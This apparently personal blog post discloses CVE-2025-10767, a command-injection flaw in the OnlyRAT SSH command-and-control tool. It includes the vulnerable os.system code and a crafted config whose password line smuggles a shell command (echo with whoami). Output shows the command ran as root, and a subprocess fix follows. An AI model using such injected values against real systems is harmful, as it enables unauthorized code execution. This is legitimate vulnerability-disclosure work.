<!DOCTYPE html>
<html lang="en">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    
    <title>
      
        CVE-2025-10767
      
    </title>

    
    <link rel="icon" type="image/png" href="../../favicon-96x96.png" sizes="96x96">
    <link rel="icon" type="image/svg+xml" href="../../favicon.svg">
    <link rel="shortcut icon" href="../../favicon.ico">
    <link rel="apple-touch-icon" sizes="180x180" href="../../apple-touch-icon.png">
    <link rel="manifest" href="../../site.webmanifest">

    
    <meta property="og:type" content="website">
    <meta property="og:title"
          content="CVE-2025-10767">
    <meta property="og:description"
          content="When adversaries fail to harden their own tools: OnlyRAT an OpenSource C2 whose unsafe use of shell calls lets crafted configs execute arbitary commands.">
    <meta property="og:image"
          content="">
    <meta property="og:url" content="http://localhost:1313/research/cve-2025-10767/">

    <meta name="twitter:card" content="summary_large_image">

    
    
    

  <link rel="stylesheet"
        href="../../css/style.min.3f73f2347843a7a89acfe85a677d60b2.css"
        integrity="md5-P3PyNHhDp6iaz&#43;haZ31gsg=="
        crossorigin>

  <link rel="stylesheet"
        href="../../css/chroma.min.a44a970f5e0d1481ed8d220169806a06.css"
        integrity="md5-pEqXD14NFIHtjSIBaYBqBg=="
        crossorigin>

  </head>

  <body>
    
    <header>
      <div class="banner">
        <pre class=ascii>
              .__  __   
   ___________|__|/  |_ 
  / ___\_  __ \  \   __\
 / /_/  >  | \/  ||  |  
 \___  /|__|  |__||__|  
/_____/                 
</pre>

      </div>

      
      <p class="quote">
        Obsess over every detail. Ask why it works. Ask why it isn’t built another way.
      </p>

      
      <nav id="menu">
        <a href="../../"
           class="">
          <span class="arrow">»</span> home
        </a>

        <a href="../../research"
           class="">
          <span class="arrow">»</span> research
        </a>

        <a href="../../tags"
           class="">
          <span class="arrow">»</span> tags
        </a>

        <a href="../../about"
           class="">
          <span class="arrow">»</span> about
        </a>
      </nav>
    </header>

    
    <main>
      
  

  <article>
    
      <h2>CVE-2025-10767</h2>
    

    <h1 id="whats-up">What&rsquo;s up?</h1>
<p>Lately I’ve been digging into vulnerability research - reading writeups and watching videos about adversarial toolkits that turned out to be vulnerable themselves. Shout-out to my friend Chebuya for the insights on this topic.</p>
<h1 id="what-made-me-delve-into-this-topic">What made me delve into this topic?</h1>
<p>Most vulnerability researchers, hackers, and threat actors look for bugs in enterprise software, apps, and the like. But what if we look for vulnerabilities in the tools researchers use? IDA, BloodHound, Havoc, Sliver, Cobalt Strike - it’s ironic, but these tools can also contain exploitable mistakes.</p>
<h1 id="start-of-exploration">Start of exploration</h1>
<p>While hunting projects, I looked at OnlyRAT, a network-oriented and virtually fileless SSH C2 developed by CosmodiumCS (malware dev community). I dove into the project and immediately noticed something wrong.</p>
<p>In this line we see that the program receives three parameters: IP address, password, and port:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">if</span> <span class="n">option</span> <span class="o">==</span> <span class="s2">&#34;orconsole&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">connect</span><span class="p">(</span><span class="n">ipv4</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Following the <strong>connect</strong> function, the password is directly inserted into a shell command using <strong>os.system</strong>. That’s a big red flag - I’ll show why later.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">connect</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2"> [*] Connecting to target...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;sshpass -p </span><span class="se">\&#34;</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="se">\&#34;</span><span class="s2"> ssh onlyrat@</span><span class="si">{</span><span class="n">address</span><span class="si">}</span><span class="s2"> -p </span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Looking at where the password comes from, <strong>main.py</strong> reads it from a configuration file:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_config</span><span class="p">(</span><span class="n">config_file</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># get file contents</span>
</span></span><span class="line"><span class="cl">    <span class="n">read_lines</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">config_file</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">configuration</span><span class="p">[</span><span class="s2">&#34;PASSWORD&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">read_lines</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>main.py</strong> accepts a config file as an argument:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">rat_file</span> <span class="o">=</span> <span class="n">argument</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># check if configuration file exists</span>
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">configuration</span> <span class="o">=</span> <span class="n">read_config</span><span class="p">(</span><span class="n">rat_file</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, craft a maliciously formed configuration file:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">127.0.0.1
</span></span><span class="line"><span class="cl"><span class="s2">&#34;;echo</span><span class="si">${</span><span class="nv">IFS</span><span class="si">}</span><span class="s2">pwned</span><span class="si">${</span><span class="nv">IFS</span><span class="si">}</span><span class="k">$(</span>whoami<span class="k">)</span><span class="s2">;#
</span></span></span><span class="line"><span class="cl"><span class="s2">/home/test
</span></span></span><span class="line"><span class="cl"><span class="s2">/home/test/startup
</span></span></span><span class="line"><span class="cl"><span class="s2">127.0.0.1
</span></span></span><span class="line"><span class="cl"><span class="s2">22
</span></span></span><span class="line"><span class="cl"><span class="s2">local
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Run OnlyRAT with that configuration file:</p>
<pre tabindex="0"><code>python3 main.py test.rat
</code></pre><p>Executing the <strong>orconsole</strong> command leads to command injection inside the C2:</p>
<pre tabindex="0"><code>[~] root@onlyrat $ orconsole
[*] Connecting to target…
sh: 1: sshpass: not found
pwned root
</code></pre><h1 id="how-did-this-happen">How did this happen?</h1>
<p>This succeeded because OnlyRAT concatenates an attacker-controlled password into a shell command and calls <strong>os.system</strong>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;sshpass -p </span><span class="se">\&#34;</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="se">\&#34;</span><span class="s2"> ssh onlyrat@</span><span class="si">{</span><span class="n">address</span><span class="si">}</span><span class="s2"> -p </span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Even if the value is quoted, shell parsing/escaping can still be abused. A safer approach is to avoid the shell and use <strong>subprocess</strong> with an argument list (this prevents the shell from interpreting special characters):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Unsafe</span>
</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;sshpass -p </span><span class="se">\&#34;</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="se">\&#34;</span><span class="s2"> scp -P </span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s2"> onlyrat@</span><span class="si">{</span><span class="n">address</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2"> ~/Downloads&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Safer</span>
</span></span><span class="line"><span class="cl"><span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s2">&#34;sshpass&#34;</span><span class="p">,</span> <span class="s2">&#34;-p&#34;</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="s2">&#34;scp&#34;</span><span class="p">,</span> <span class="s2">&#34;-P&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">port</span><span class="p">),</span> <span class="sa">f</span><span class="s2">&#34;onlyrat@</span><span class="si">{</span><span class="n">address</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;~/Downloads&#34;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="n">check</span><span class="o">=</span><span class="kc">True</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div>
  </article>

    </main>

    
    <footer>
      
    </footer>
  </body>
</html>
